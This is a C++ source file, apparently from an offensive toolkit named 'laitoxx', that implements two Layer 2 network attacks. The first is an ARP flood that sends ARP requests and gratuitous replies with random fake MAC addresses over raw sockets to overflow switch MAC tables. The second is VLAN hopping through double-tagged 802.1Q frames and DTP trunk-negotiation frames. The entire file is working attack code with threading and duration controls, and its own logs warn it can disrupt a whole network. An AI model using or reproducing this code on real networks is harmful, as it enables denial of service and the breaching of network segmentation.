#include "l2_attacks.h"
#include <random>
#include <chrono>
#include <cstring>
#include <sstream>
#include <iomanip>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netinet/if_ether.h>
    #include <net/if_arp.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <net/if.h>
    #include <sys/ioctl.h>
    #include <linux/if_packet.h>
#endif

namespace laitoxx {

// Utility
static std::string random_mac() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 255);

    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 6; ++i) {
        if (i > 0) ss << ":";
        ss << std::setw(2) << dis(gen);
    }
    return ss.str();
}

static void mac_string_to_bytes(const std::string& mac_str, unsigned char* mac_bytes) {
    sscanf(mac_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
           &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]);
}

// ============================================================================
// ARP Flood
// ============================================================================

void ARPFlood::start() {
    log("Starting ARP flood / MAC table overflow attack");
    log("WARNING: This can disrupt the entire local network!");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&ARPFlood::attack_worker, this);
    }
}

std::string ARPFlood::random_mac() {
    return ::laitoxx::random_mac();
}

std::vector<char> ARPFlood::build_arp_request(const std::string& target_ip, const std::string& fake_mac) {
    std::vector<char> packet;

#ifndef _WIN32
    // Ethernet header (14 bytes)
    struct ether_header eth;
    memset(&eth, 0, sizeof(eth));

    // Destination: broadcast
    memset(eth.ether_dhost, 0xFF, 6);

    // Source: fake MAC
    unsigned char src_mac[6];
    mac_string_to_bytes(fake_mac, src_mac);
    memcpy(eth.ether_shost, src_mac, 6);

    // EtherType: ARP (0x0806)
    eth.ether_type = htons(ETH_P_ARP);

    packet.insert(packet.end(), (char*)&eth, (char*)&eth + sizeof(eth));

    // ARP packet (28 bytes)
    struct arphdr arp;
    arp.ar_hrd = htons(ARPHRD_ETHER); // Hardware type: Ethernet
    arp.ar_pro = htons(ETH_P_IP);     // Protocol type: IP
    arp.ar_hln = 6;                   // Hardware address length
    arp.ar_pln = 4;                   // Protocol address length
    arp.ar_op = htons(ARPOP_REQUEST); // Operation: ARP request

    packet.insert(packet.end(), (char*)&arp, (char*)&arp + sizeof(arp));

    // Sender hardware address (fake MAC)
    packet.insert(packet.end(), (char*)src_mac, (char*)src_mac + 6);

    // Sender protocol address (random IP)
    struct in_addr sender_ip;
    inet_pton(AF_INET, "192.168.1.1", &sender_ip);
    packet.insert(packet.end(), (char*)&sender_ip, (char*)&sender_ip + 4);

    // Target hardware address (zeros for request)
    packet.insert(packet.end(), 6, 0);

    // Target protocol address
    struct in_addr target_addr;
    inet_pton(AF_INET, target_ip.c_str(), &target_addr);
    packet.insert(packet.end(), (char*)&target_addr, (char*)&target_addr + 4);
#endif

    return packet;
}

std::vector<char> ARPFlood::build_arp_reply(const std::string& target_ip, const std::string& fake_mac) {
    auto packet = build_arp_request(target_ip, fake_mac);

#ifndef _WIN32
    // Change operation to REPLY
    if (packet.size() >= sizeof(struct ether_header) + sizeof(struct arphdr)) {
        struct arphdr* arp = (struct arphdr*)(packet.data() + sizeof(struct ether_header));
        arp->ar_op = htons(ARPOP_REPLY);
    }
#endif

    return packet;
}

void ARPFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

#ifndef _WIN32
    // Create raw socket for L2 packets
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        log("Error: Raw socket creation failed. Need root privileges.");
        return;
    }

    // Get interface index
    struct ifreq ifr;
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        strncpy(ifr.ifr_name, "ens33", IFNAMSIZ - 1); // Try alternative
        if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
            log("Error: Interface not found");
            close(sock);
            return;
        }
    }

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    memset(addr.sll_addr, 0xFF, 6); // Broadcast

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        // Send many ARP requests with different fake MACs
        for (int i = 0; i < 1000 && !stop_flag_; ++i) {
            std::string fake = random_mac();
            auto packet = build_arp_request(config_.target_ip, fake);

            sendto(sock, packet.data(), packet.size(), 0,
                   (struct sockaddr*)&addr, sizeof(addr));
            packets_sent_++;

            // Also send gratuitous ARP replies
            auto reply = build_arp_reply(config_.target_ip, fake);
            sendto(sock, reply.data(), reply.size(), 0,
                   (struct sockaddr*)&addr, sizeof(addr));
            packets_sent_++;
        }
    }

    close(sock);
#else
    log("ARP flood requires raw sockets (Linux only)");
#endif
}

// ============================================================================
// VLAN Hopping
// ============================================================================

void VLANHopping::start() {
    log("Starting VLAN hopping attack (double-tagging)");
    log("WARNING: Can compromise VLAN segmentation!");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&VLANHopping::attack_worker, this);
    }
}

std::vector<char> VLANHopping::build_double_tagged_frame(uint16_t outer_vlan, uint16_t inner_vlan) {
    std::vector<char> packet;

#ifndef _WIN32
    // Ethernet header
    struct ether_header eth;
    memset(&eth, 0, sizeof(eth));

    // Destination: broadcast or specific target
    memset(eth.ether_dhost, 0xFF, 6);

    // Source: attacker MAC
    unsigned char src_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    memcpy(eth.ether_shost, src_mac, 6);

    // EtherType: 802.1Q (0x8100)
    eth.ether_type = htons(0x8100);

    packet.insert(packet.end(), (char*)&eth, (char*)&eth + sizeof(eth));

    // Outer VLAN tag (4 bytes)
    uint16_t outer_tag = (outer_vlan & 0x0FFF) | (0 << 13); // Priority 0
    packet.push_back((outer_tag >> 8) & 0xFF);
    packet.push_back(outer_tag & 0xFF);

    // Inner EtherType: 802.1Q again for double-tagging
    packet.push_back(0x81);
    packet.push_back(0x00);

    // Inner VLAN tag (4 bytes)
    uint16_t inner_tag = (inner_vlan & 0x0FFF) | (0 << 13);
    packet.push_back((inner_tag >> 8) & 0xFF);
    packet.push_back(inner_tag & 0xFF);

    // EtherType for payload: IP (0x0800)
    packet.push_back(0x08);
    packet.push_back(0x00);

    // Payload (minimal IP packet or junk)
    for (int i = 0; i < 60; ++i) {
        packet.push_back(rand() & 0xFF);
    }
#endif

    return packet;
}

std::vector<char> VLANHopping::build_dtp_frame() {
    // Dynamic Trunking Protocol frame
    // DTP is Cisco proprietary, used to negotiate trunk links
    std::vector<char> packet;

#ifndef _WIN32
    // Ethernet header
    struct ether_header eth;
    memset(&eth, 0, sizeof(eth));

    // Destination: DTP multicast (01:00:0C:CC:CC:CC)
    eth.ether_dhost[0] = 0x01;
    eth.ether_dhost[1] = 0x00;
    eth.ether_dhost[2] = 0x0C;
    eth.ether_dhost[3] = 0xCC;
    eth.ether_dhost[4] = 0xCC;
    eth.ether_dhost[5] = 0xCC;

    // Source
    unsigned char src_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    memcpy(eth.ether_shost, src_mac, 6);

    // EtherType: 802.1Q
    eth.ether_type = htons(0x8100);

    packet.insert(packet.end(), (char*)&eth, (char*)&eth + sizeof(eth));

    // VLAN tag (native VLAN 1)
    packet.push_back(0x00);
    packet.push_back(0x01);

    // LLC/SNAP header for DTP
    packet.push_back(0x01); // DSAP
    packet.push_back(0x00); // SSAP

    // DTP payload (simplified)
    for (int i = 0; i < 50; ++i) {
        packet.push_back(0x00);
    }
#endif

    return packet;
}

void VLANHopping::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

#ifndef _WIN32
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        log("Error: Raw socket creation failed. Need root privileges.");
        return;
    }

    // Get interface
    struct ifreq ifr;
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        strncpy(ifr.ifr_name, "ens33", IFNAMSIZ - 1);
        if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
            close(sock);
            return;
        }
    }

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifr.ifr_ifindex;

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        // Double-tagging attack: outer VLAN is native (1), inner is target VLAN
        for (uint16_t target_vlan = 10; target_vlan < 100 && !stop_flag_; target_vlan += 10) {
            auto packet = build_double_tagged_frame(1, target_vlan);
            sendto(sock, packet.data(), packet.size(), 0,
                   (struct sockaddr*)&addr, sizeof(addr));
            packets_sent_++;
        }

        // Send DTP frames to trigger trunk negotiation
        auto dtp = build_dtp_frame();
        sendto(sock, dtp.data(), dtp.size(), 0,
               (struct sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(sock);
#else
    log("VLAN hopping requires raw sockets (Linux only)");
#endif
}

} // namespace laitoxx
